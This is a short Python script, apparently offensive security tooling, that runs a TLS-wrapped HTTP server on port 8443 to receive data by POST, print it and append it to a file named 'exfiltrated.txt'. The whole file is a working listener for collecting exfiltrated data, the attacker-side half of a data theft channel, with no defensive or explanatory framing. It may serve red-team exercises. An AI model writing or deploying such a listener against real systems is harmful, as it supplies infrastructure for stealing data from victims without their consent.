import http.server
import ssl

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        print(f"[+] Data received: {data.decode(errors='ignore')}")
        with open("exfiltrated.txt", "ab") as f:
            f.write(data + b"\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Data received\n")

if __name__ == "__main__":
    server_address = ('0.0.0.0', 8443)
    httpd = http.server.HTTPServer(server_address, Handler)

    # Crear contexto SSL moderno
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="cert.pem")

    # Envolver el socket con el contexto SSL
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    print("[*] Listening on https://0.0.0.0:8443")
    httpd.serve_forever()